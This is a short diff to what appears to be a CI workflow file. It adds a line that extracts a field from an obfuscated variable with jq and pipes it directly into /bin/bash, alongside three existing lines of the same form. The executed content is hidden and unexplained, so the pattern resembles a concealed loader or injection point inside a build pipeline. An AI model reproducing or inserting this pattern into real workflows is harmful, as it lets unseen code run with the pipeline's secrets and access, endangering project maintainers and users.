@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$diwvg63" | jq -r .pzbm2 | /bin/bash
           printf '%s' "$g19" | jq -r .l6236 | /bin/bash
           echo $y2 | jq -r .rv810 | /bin/bash
+          printf '%s' "$uxis5" | jq -r .q5086 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
